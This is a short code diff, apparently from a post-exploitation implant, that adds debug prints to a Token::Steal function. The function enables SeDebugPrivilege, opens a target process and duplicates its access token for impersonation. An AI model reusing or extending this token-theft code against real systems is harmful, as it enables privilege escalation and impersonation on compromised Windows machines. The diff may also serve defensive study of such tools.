@@ -288,11 +288,15 @@ auto DECLFN Token::Steal(
 
     HANDLE hCurrentToken = this->CurrentPs();
     if ( hCurrentToken ) {
+        KhDbg("dbg");
         this->SetPriv( hCurrentToken, "SeDebugPrivilege" );
+        KhDbg("dbg");
         Self->Ntdll.NtClose( hCurrentToken );
+        KhDbg("dbg");
     }
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
+    KhDbg("dbg");
     if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
         KhDbg("[-] Failed to open target process\n");
         goto _KH_END;
@@ -305,6 +309,8 @@ auto DECLFN Token::Steal(
         goto _KH_END;
     }
 
+    KhDbg("dbg");
+
     Self->Ntdll.NtClose( ProcessHandle );
     ProcessHandle = INVALID_HANDLE_VALUE;
 
@@ -314,10 +320,13 @@ auto DECLFN Token::Steal(
         nullptr,
         SecurityImpersonation,
         TokenImpersonation,
-        &TokenDuplicated ) ) {
-        
+        &TokenDuplicated ) 
+    ) {
+        KhDbg("dbg");    
         Self->Ntdll.NtClose( TokenHandle );
+        KhDbg("dbg");
         return this->Add( TokenDuplicated, ProcessID );
+        KhDbg("dbg");
     } else {
         KhDbg("[!] DuplicateTokenEx failed: using original token (may be limited)\n");
         return this->Add( TokenHandle, ProcessID );
